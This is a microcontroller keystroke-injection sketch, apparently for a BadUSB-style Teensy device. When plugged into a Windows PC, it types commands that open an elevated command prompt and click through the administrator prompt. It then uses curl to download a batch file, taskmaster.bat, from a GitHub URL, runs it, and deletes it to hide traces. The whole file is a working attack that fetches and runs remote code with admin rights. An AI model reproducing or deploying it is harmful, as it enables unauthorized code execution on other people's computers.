void setup() {

  // windows want to "set up" keybaord devices, annoying
  delay(5000);

  // open windows run dialog
  Keyboard.press(MODIFIERKEY_GUI);
  Keyboard.press(KEY_R);
  delay(50);
  Keyboard.release(MODIFIERKEY_GUI);
  Keyboard.release(KEY_R);
  delay(150);

  // run cmd as admin
  Keyboard.print("cmd");
  Keyboard.press(MODIFIERKEY_CTRL);
  Keyboard.press(MODIFIERKEY_SHIFT);
  delay(5);
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  Keyboard.release(MODIFIERKEY_CTRL);
  Keyboard.release(MODIFIERKEY_SHIFT);
  delay(1000);
  Keyboard.press(KEY_LEFT); // accept run as administrator in popup
  Keyboard.release(KEY_LEFT);
  delay(200);
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);

  delay(200);


  // deliver payload
  Keyboard.print("curl https://raw.githubusercontent.com/william-lundgren/Funkydevice/refs/heads/main/taskmaster.bat -o taskmaster.bat");
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(1500);

  // run payload
  Keyboard.print(".\\taskmaster.bat");
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(2000);

  // Optional, remove payload
  Keyboard.print("del taskmaster.bat");
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(50);

  // Close CMD
  Keyboard.print("exit");
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
}

void loop() {
  // emptyy :)
}
